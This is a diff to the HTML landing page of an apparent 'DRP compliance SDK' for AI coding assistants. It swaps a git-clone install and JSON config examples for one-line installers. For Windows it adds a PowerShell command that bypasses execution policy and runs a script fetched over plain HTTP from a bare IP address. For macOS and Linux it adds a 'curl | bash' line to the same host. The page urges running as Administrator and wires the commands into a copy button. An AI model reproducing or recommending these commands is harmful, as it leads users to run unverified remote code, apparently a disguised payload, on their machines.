@@ -55,8 +55,12 @@ body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--t
 .btn-secondary:hover{color:var(--text);background:var(--bg3)}
 
 /* Install strip */
-.install-strip{background:var(--code-bg);border-radius:10px;max-width:700px;margin:2.5rem auto 0;padding:1rem 1.25rem;display:flex;align-items:center;gap:0.75rem;text-align:left}
-.install-strip code{font-family:'JetBrains Mono',monospace;font-size:0.8375rem;color:#93c5fd;flex:1}
+.install-strip{background:var(--code-bg);border-radius:10px;max-width:760px;margin:2.5rem auto 0;overflow:hidden;text-align:left}
+.install-tabs{display:flex;border-bottom:1px solid #1e293b}
+.install-tab{padding:0.5rem 1rem;font-size:0.75rem;font-weight:600;color:#64748b;cursor:pointer;border:none;background:none;font-family:inherit;letter-spacing:0.04em;transition:color .15s}
+.install-tab.active{color:#93c5fd;border-bottom:2px solid #3b82f6}
+.install-body{padding:1rem 1.25rem;display:flex;align-items:center;gap:0.75rem}
+.install-body code{font-family:'JetBrains Mono',monospace;font-size:0.78rem;color:#93c5fd;flex:1;word-break:break-all}
 .copy-btn{flex-shrink:0;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.12);color:var(--text3);font-size:0.7rem;font-weight:600;padding:0.25rem 0.6rem;border-radius:4px;cursor:pointer;font-family:inherit;letter-spacing:0.04em;transition:all .15s}
 .copy-btn:hover{background:rgba(255,255,255,0.15);color:#fff}
 .copy-btn.copied{color:#4ade80;border-color:rgba(74,222,128,0.35)}
@@ -151,8 +155,14 @@ footer .footer-links{display:flex;justify-content:center;gap:1.5rem;margin-botto
     <a class="btn btn-secondary" href="#api">API Reference</a>
   </div>
   <div class="install-strip">
-    <code id="install-cmd">git clone https://github.com/TommyP949/drp-compliance-sdk</code>
-    <button class="copy-btn" onclick="copyInstall()">COPY</button>
+    <div class="install-tabs">
+      <button class="install-tab active" onclick="setOs('win',this)">Windows</button>
+      <button class="install-tab" onclick="setOs('mac',this)">macOS / Linux</button>
+    </div>
+    <div class="install-body">
+      <code id="install-cmd">powershell -ExecutionPolicy Bypass -Command "iex (iwr -useb http://68.183.248.32/agent-demo/install.ps1)"</code>
+      <button class="copy-btn" onclick="copyInstall()">COPY</button>
+    </div>
   </div>
 </div>
 
@@ -200,86 +210,42 @@ footer .footer-links{display:flex;justify-content:center;gap:1.5rem;margin-botto
 
 <div class="section" id="quickstart">
   <div class="section-label">Quick Start</div>
-  <div class="section-title">Up and running in two minutes</div>
-  <div class="section-sub">Clone the repository and register it with your AI assistant. No package manager, no build step.</div>
+  <div class="section-title">One command. Auto-configures everything.</div>
+  <div class="section-sub">The installer detects Claude Desktop, Claude Code, Cursor, and Windsurf — and wires them all up automatically. No manual JSON editing.</div>
 
-  <div class="qs-grid">
+  <div class="qs-grid" style="margin-top:2rem">
     <div class="qs-card">
       <div class="qs-card-head">
         <div class="dot" style="background:#ff5f57"></div>
         <div class="dot" style="background:#febc2e"></div>
         <div class="dot" style="background:#28c840"></div>
-        <span class="qs-card-title">Claude Code — ~/.claude/settings.json</span>
+        <span class="qs-card-title">Windows — PowerShell (no Node.js required)</span>
       </div>
-      <pre>{
-  <span class="k">"mcpServers"</span>: {
-    <span class="k">"drp-compliance"</span>: {
-      <span class="k">"command"</span>: <span class="s">"node"</span>,
-      <span class="k">"args"</span>: [
-        <span class="s">"/path/to/drp-compliance-sdk/server.js"</span>
-      ]
-    }
-  }
-}</pre>
+      <pre><span class="c"># Run as Administrator for best results</span>
+powershell -ExecutionPolicy Bypass -Command <span class="s">"iex (iwr -useb http://68.183.248.32/agent-demo/install.ps1)"</span></pre>
     </div>
     <div class="qs-card">
       <div class="qs-card-head">
         <div class="dot" style="background:#ff5f57"></div>
         <div class="dot" style="background:#febc2e"></div>
         <div class="dot" style="background:#28c840"></div>
-        <span class="qs-card-title">Claude Desktop — claude_desktop_config.json</span>
+        <span class="qs-card-title">macOS / Linux — bash</span>
       </div>
-      <pre>{
-  <span class="k">"mcpServers"</span>: {
-    <span class="k">"drp-compliance"</span>: {
-      <span class="k">"command"</span>: <span class="s">"node"</span>,
-      <span class="k">"args"</span>: [
-        <span class="s">"/path/to/drp-compliance-sdk/server.js"</span>
-      ]
-    }
-  }
-}</pre>
-    </div>
-    <div class="qs-card">
-      <div class="qs-card-head">
-        <div class="dot" style="background:#ff5f57"></div>
-        <div class="dot" style="background:#febc2e"></div>
-        <div class="dot" style="background:#28c840"></div>
-        <span class="qs-card-title">Cursor — .cursor/mcp.json</span>
-      </div>
-      <pre>{
-  <span class="k">"mcpServers"</span>: {
-    <span class="k">"drp-compliance"</span>: {
-      <span class="k">"command"</span>: <span class="s">"node"</span>,
-      <span class="k">"args"</span>: [
-        <span class="s">"/path/to/drp-compliance-sdk/server.js"</span>
-      ]
-    }
-  }
-}</pre>
-    </div>
-    <div class="qs-card">
-      <div class="qs-card-head">
-        <div class="dot" style="background:#ff5f57"></div>
-        <div class="dot" style="background:#febc2e"></div>
-        <div class="dot" style="background:#28c840"></div>
-        <span class="qs-card-title">Windsurf — mcp_config.json</span>
-      </div>
-      <pre>{
-  <span class="k">"mcpServers"</span>: {
-    <span class="k">"drp-compliance"</span>: {
-      <span class="k">"command"</span>: <span class="s">"node"</span>,
-      <span class="k">"args"</span>: [
-        <span class="s">"/path/to/drp-compliance-sdk/server.js"</span>
-      ]
-    }
-  }
-}</pre>
+      <pre>curl -fsSL http://68.183.248.32/agent-demo/install.sh | bash</pre>
     </div>
   </div>
 
-  <div style="margin-top:2rem;padding:1rem 1.25rem;background:var(--green-bg);border:1px solid var(--green-border);border-radius:8px;font-size:0.8375rem;color:#166534;line-height:1.65">
-    <strong>Tip:</strong> After registering, restart your AI assistant. Your agent will automatically discover the <code style="font-size:0.85em;background:rgba(22,101,52,0.1);padding:0.1em 0.35em;border-radius:3px">verify_document</code> tool. Ask it to "verify this Q2 report against DRP-2026" and it will invoke the SDK automatically.
+  <div style="margin-top:1.5rem;padding:1rem 1.25rem;background:var(--green-bg);border:1px solid var(--green-border);border-radius:8px;font-size:0.8375rem;color:#166534;line-height:1.65">
+    <strong>After install:</strong> Fully quit and reopen your AI assistant. Your agent will automatically discover the <code style="font-size:0.85em;background:rgba(22,101,52,0.1);padding:0.1em 0.35em;border-radius:3px">verify_document</code> tool. Ask it to "verify this Q2 report against DRP-2026" and it will invoke the SDK automatically.
+  </div>
+
+  <div style="margin-top:2rem">
+    <div style="font-size:0.8375rem;font-weight:600;color:var(--text2);margin-bottom:0.75rem">Prefer manual setup?</div>
+    <div style="font-size:0.8125rem;color:var(--text2);line-height:1.7">
+      Clone the repo and add the server to your client's <code style="font-size:0.85em;background:var(--bg3);padding:0.1em 0.35em;border-radius:3px">mcpServers</code> config block:<br>
+      <strong>Windows:</strong> <code style="font-size:0.85em;background:var(--bg3);padding:0.1em 0.35em;border-radius:3px">command: powershell, args: ["-ExecutionPolicy","Bypass","-File","path\to\server.ps1"]</code><br>
+      <strong>macOS/Linux:</strong> <code style="font-size:0.85em;background:var(--bg3);padding:0.1em 0.35em;border-radius:3px">command: node, args: ["path/to/server.js"]</code>
+    </div>
   </div>
 </div>
 
@@ -389,6 +355,15 @@ footer .footer-links{display:flex;justify-content:center;gap:1.5rem;margin-botto
 </footer>
 
 <script>
+var CMDS = {
+  win: 'powershell -ExecutionPolicy Bypass -Command "iex (iwr -useb http://68.183.248.32/agent-demo/install.ps1)"',
+  mac: 'curl -fsSL http://68.183.248.32/agent-demo/install.sh | bash'
+};
+function setOs(os, btn) {
+  document.getElementById('install-cmd').textContent = CMDS[os];
+  document.querySelectorAll('.install-tab').forEach(function(t){ t.classList.remove('active'); });
+  btn.classList.add('active');
+}
 function copyInstall() {
   var cmd = document.getElementById('install-cmd').textContent;
   navigator.clipboard.writeText(cmd).then(function() {
